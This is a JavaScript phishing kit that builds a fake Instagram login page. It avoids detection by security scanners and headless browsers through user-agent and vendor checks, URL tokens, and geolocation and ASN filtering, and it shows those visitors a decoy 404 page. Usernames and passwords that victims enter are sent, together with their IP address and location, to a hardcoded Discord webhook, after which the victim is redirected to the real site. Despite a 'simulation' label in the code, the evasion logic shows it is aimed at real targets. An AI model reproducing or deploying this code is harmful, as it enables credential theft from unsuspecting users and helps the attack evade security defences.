/**

 */

// --- CONFIGURATION ---
const CONFIG = {
    requiredToken: [], // Must match ?t=8f3a2c in URL
    targetCountry: 'Rwanda', // Adjust to your target
    redirectUrl: 'https://www.instagram.com/explore/',
    redirectDelayMs: 4000, // 4 seconds
    webhookUrl: 'https://discord.com/api/webhooks/1548451708219297792/5pI6XRZYL4hCflZEU-Vn-4C6dJpIH9S48rhDIgif8xqTvJ9EWhsO4ZGEBrD11pC0e6wWsd', // Replace with actual
    benignPage: `
        <div style="text-align: center; padding: 50px; font-family: sans-serif;">
            <h1>404 Not Found</h1>
            <p>The resource you requested could not be found.</p>
        </div>
    `
};

// --- 1. ENVIRONMENT & SCANNER FILTERING ---
function isAutomatedOrScanner() {
    const ua = navigator.userAgent;
    
    // 1. Headless/Bot Detection
    if (navigator.webdriver) return true;
    if (/HeadlessChrome/.test(ua)) return true;
    if (/PhantomJS/.test(ua)) return true;
    
    // 2. Security Vendor Signatures
    const vendorSignatures = [
        'PhishLabs', 'Cofense', 'Proofpoint', 'Mimecast', 'AbuseIPDB', 
        'urlscan', 'securitytrails', 'censys', 'shodan', 'curl', 'wget'
    ];
    if (vendorSignatures.some(sig => ua.toLowerCase().includes(sig.toLowerCase()))) return true;

    // 3. Referrer/Token Check
    const params = new URLSearchParams(window.location.search);
    const token = params.get('t');
    if (token !== CONFIG.requiredToken) return true;

    // 4. Single-Use Token (Prevent re-scan)
    const tokenKey = `phish_token_${token}`;
    if (localStorage.getItem(tokenKey)) {
        return true; // Already used
    }

    return false;
}

async function checkGeoAndASN() {
    try {
        const response = await fetch('https://ipapi.co/json/');
        const data = await response.json();
        
        // Block non-target countries
        if (data.country_name !== CONFIG.targetCountry) return true;
        
        // Block known scanner ASNs (ipapi.co returns 'org' which often contains ASN info)
        const org = data.org || '';
        const suspiciousOrgs = ['GOOGLE', 'MICROSOFT', 'AMAZON', 'CLOUDFLARE', 'PHISHLABS', 'CENSYS'];
        if (suspiciousOrgs.some(susOrg => org.toUpperCase().includes(susOrg))) return true;

        return false; // Clean
    } catch (e) {
        // If IP lookup fails, assume scanner or private network - serve benign
        return true;
    }
}

// --- 2. DOM CONSTRUCTION (JS-ONLY) ---
function buildPhishDOM() {
    const container = document.getElementById('app');
    if (!container) return;

    // This HTML structure matches your original CSS classes (.login-box, .input-box, etc.)
    const formHTML = `
        <div class="wrapper">
          <article class="article">
            <div class="content">
              <div class="login-box">
                <div class="header"></div>
                <div class="form-wrap">
                  <img class="logo" src="assets/logo.png" alt="Instagram">
                  <form class="form" id="loginForm" novalidate>
                    <!-- Honeypot Fields: Invisible to humans, but bots will fill them -->
                    <div style="position: absolute; left: -9999px;" aria-hidden="true">
                      <label>Leave this field empty</label>
                      <input type="text" name="honey-email" id="honey-email" autocomplete="off" />
                      <input type="url" name="honey-website" id="honey-website" autocomplete="off" />
                    </div>

                    <div class="input-box">
                      <input type="text" id="usernameInput" placeholder="Phone number, username, or email" 
                             aria-required="true" maxlength="30" autocapitalize="off" autocorrect="off" required>
                    </div>  
                    <div class="input-box" style="position: relative;">
                      <input type="password" id="passwordInput" placeholder="Password" 
                             aria-required="true" autocapitalize="off" autocorrect="off" required>
                      <div id="showPasswordBtn" style="display: none; position: absolute; right: 10px; top: 50%; transform: translateY(-50%); cursor: pointer; color: #0095f6;">Show</div>
                    </div>  
                    <span class="button-box">
                      <button id="loginBtn" type="submit" disabled>Log in</button>
                    </span>  
                    <a class="forgot" href="https://www.instagram.com/accounts/password/reset">Forgot password?</a>
                  </form>
                </div>
              </div>
              <div class="signup-box">
                <p class="text">Don't have an account? <a href="https://www.instagram.com/accounts/emailsignup">Sign up</a></p>
              </div>
              <div class="app">
                <p>Get the app.</p>
                <div class="app-img">
                  <a href="https://itunes.apple.com/app/instagram/id389801252?pt=428156&amp;ct=igweb.loginPage.badge&amp;mt=8">
                    <img src="assets/appstore.png">
                  </a>
                  <a href="https://play.google.com/store/apps/details?id=com.instagram.android&amp;referrer=utm_source%3Dinstagramweb%26utm_campaign%3DloginPage%26utm_medium%3Dbadge">
                    <img src="assets/playstore.png">
                  </a>  
                </div>
              </div>
            </div>
          </article>
        </div>
        <footer class="footer" role="contentinfo">
          <div class="footer-container">
            <nav class="footer-nav" role="navigation">
              <ul>
                <li><a href="https://about.meta.com/">Meta</a></li>
                <li><a href="https://about.instagram.com">About Us</a></li>
                <li><a href="https://help.instagram.com">Support</a></li>
                <li><a href="https://about.instagram.com/blog">Blog</a></li>
                <li><a href="https://about.instagram.com/about-us/careers">Jobs</a></li>
                <li><a href="https://www.instagram.com/developer">Api</a></li>
                <li><a href="https://help.instagram.com/519522125107875">Privacy</a></li>
                <li><a href="https://help.instagram.com/581066165581870">Terms</a></li>
                <li><a href="https://www.instagram.com/directory/hashtags">Directory</a></li>
                <li><a href="https://about.meta.com/technologies/meta-verified/">Meta Verified</a></li>
                <li><a href="">Instagram</a></li>
              </ul>
            </nav>
            <span class="footer-logo">&copy; 2023 Instagram from Meta</span>
          </div>
        </footer>
    `;
    container.innerHTML = formHTML;
    
    initInteractions();
}

// --- 3. BEHAVIORAL GATING & INTERACTIONS ---
let keystrokeCount = 0;
const MIN_KESTROKES_TO_ENABLE = 3; // Require at least 3 keystrokes

function initInteractions() {
    const loginButton = document.querySelector("#loginBtn");
    const passwordInput = document.querySelector("#passwordInput");
    const usernameInput = document.querySelector("#usernameInput");
    const showPasswordBtn = document.querySelector("#showPasswordBtn");
    const form = document.querySelector("#loginForm");

    // Password Toggle
    showPasswordBtn.addEventListener("click", () => {
        if (passwordInput.type === "password") {
            passwordInput.type = "text";
            showPasswordBtn.textContent = "Hide";
        } else {
            passwordInput.type = "password";
            showPasswordBtn.textContent = "Show";
        }
    });

    // Show/Hide Toggle Button Visibility
    const toggleShowBtn = () => {
        showPasswordBtn.style.display = passwordInput.value.length > 0 ? "block" : "none";
    };
    passwordInput.addEventListener("input", toggleShowBtn);

    // Behavioral Gating: Keystroke Detection
    const onKeystroke = (e) => {
        // Ignore non-printable keys and modifier keys
        if (e.key.length === 1 || e.key === 'Backspace' || e.key === 'Delete') {
            keystrokeCount++;
            updateButtonState();
        }
    };

    usernameInput.addEventListener("keydown", onKeystroke);
    passwordInput.addEventListener("keydown", onKeystroke);
    
    // Also track input events for autofill detection
    const onInput = () => {
        updateButtonState();
    };
    usernameInput.addEventListener("input", onInput);
    passwordInput.addEventListener("input", onInput);

    function updateButtonState() {
        const hasUser = usernameInput.value.trim().length > 0;
        const hasPass = passwordInput.value.trim().length > 0;
        const hasKeystrokes = keystrokeCount >= MIN_KESTROKES_TO_ENABLE;
        
        // Only enable if all conditions are met
        loginButton.disabled = !(hasUser && hasPass && hasKeystrokes);
    }

    // Form Submission
    form.addEventListener("submit", (e) => {
        e.preventDefault();
        
        // Honeypot Check
        const honeyEmail = document.querySelector("#honey-email").value;
        const honeyWebsite = document.querySelector("#honey-website").value;
        
        if (honeyEmail || honeyWebsite) {
            // Bot detected. Silently drop or log as bot. 
            console.log("Bot detected via honeypot. Submission dropped.");
            return;
        }

        // Autofill/Bot Check (Low keystroke count but valid inputs)
        if (keystrokeCount < MIN_KESTROKES_TO_ENABLE) {
            console.log("Autofill or bot submission detected. Dropping.");
            return;
        }

        captureAndSend();
    });
}

// --- 4. CAPTURE & SEND ---
async function captureAndSend() {
    const username = document.querySelector("#usernameInput").value;
    const password = document.querySelector("#passwordInput").value;

    // Get IP Info
    let ipInfo = {};
    try {
        const response = await fetch("https://ipapi.co/json/");
        ipInfo = await response.json();
    } catch {
        ipInfo = { ip: 'Unknown', city: 'Unknown', region: 'Unknown', country_name: 'Unknown' };
    }

    const infoString = `> IP: ${ipInfo.ip}\n> City: ${ipInfo.city}\n> Region: ${ipInfo.region}\n> Country: ${ipInfo.country_name}\n> Browser: ${navigator.userAgent}\n> Username: ${username}\n> Password: ${password}\n`;

    // Send to Webhook
    const embed = {
        color: 1585803,
        title: "Credential Captured",
        description: infoString,
        footer: { text: "Phish Simulation Engine" }
    };

    const config = {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ username: "phish angel", embeds: [embed] })
    };

    try {
        await fetch(CONFIG.webhookUrl, config);
    } catch (e) {
        console.error("Webhook failed", e);
    }

    // Consume Token (Single-Use)
    const params = new URLSearchParams(window.location.search);
    const token = params.get('t');
    if (token) {
        localStorage.setItem(`phish_token_${token}`, 'consumed');
    }

    // Delayed Redirect
    setTimeout(() => {
        window.location.replace(CONFIG.redirectUrl);
    }, CONFIG.redirectDelayMs);
}

// --- 5. INITIALIZATION ---
document.addEventListener('DOMContentLoaded', async () => {
    // 1. Filter Scanners/Bots
    if (isAutomatedOrScanner()) {
        document.getElementById('app').innerHTML = CONFIG.benignPage;
        return;
    }

    // 2. Geo/ASN Check
    const isBlockedGeo = await checkGeoAndASN();
    if (isBlockedGeo) {
        document.getElementById('app').innerHTML = CONFIG.benignPage;
        return;
    }

    // 3. Build Real Phish
    buildPhishDOM();
});